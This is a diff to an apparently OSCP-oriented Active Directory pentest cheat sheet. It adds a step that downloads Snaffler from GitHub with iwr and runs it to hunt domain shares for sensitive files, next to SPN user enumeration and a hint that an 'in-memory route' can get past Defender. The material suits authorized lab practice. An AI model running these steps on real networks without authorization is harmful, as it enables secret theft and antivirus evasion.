@@ -69,6 +69,12 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 .\SharpView.exe Get-DomainUser -Identity {{USERNAME}}
 ```
 
+> **Setup:** get [SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler) onto the box first (precompiled `Snaffler.exe` on the Releases page). Runs in your current domain context to hunt shares for sensitive files. Defender flags it — fine on the OSCP AD set, else use an in-memory route.
+
+```powershell
+iwr https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe -OutFile Snaffler.exe
+```
+
 ```bash
 Snaffler.exe -s -d {{DOMAIN}} -o snaffler.log -v data
 ```
